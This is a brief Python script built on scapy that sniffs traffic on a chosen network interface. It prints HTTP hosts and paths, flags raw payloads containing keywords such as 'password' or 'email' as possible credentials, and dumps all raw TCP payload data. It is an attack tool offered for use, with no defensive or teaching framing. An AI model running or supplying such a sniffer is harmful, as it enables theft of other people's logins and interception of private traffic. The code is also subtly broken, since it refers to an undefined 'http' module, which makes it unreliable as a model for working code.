import scapy.all as scapy
import argparse
from scapy.layers.http import HTTPRequest

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets ", required=True)
    arguments = parser.parse_args()
    return arguments.interface

def sniffer(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

    # HTTP Packets Sniffing
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode())
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >> " + load)
                    break
    
    # TCP Packets Sniffing
    if packet.haslayer(scapy.TCP):
        if packet.haslayer(scapy.Raw):
            print(f"[+] TCP Data (Port {packet[scapy.TCP].sport} -> {packet[scapy.TCP].dport}) >> " + packet[scapy.Raw].load.decode(errors="ignore"))

    # Code Execution
iface = get_interface()
sniffer(iface)
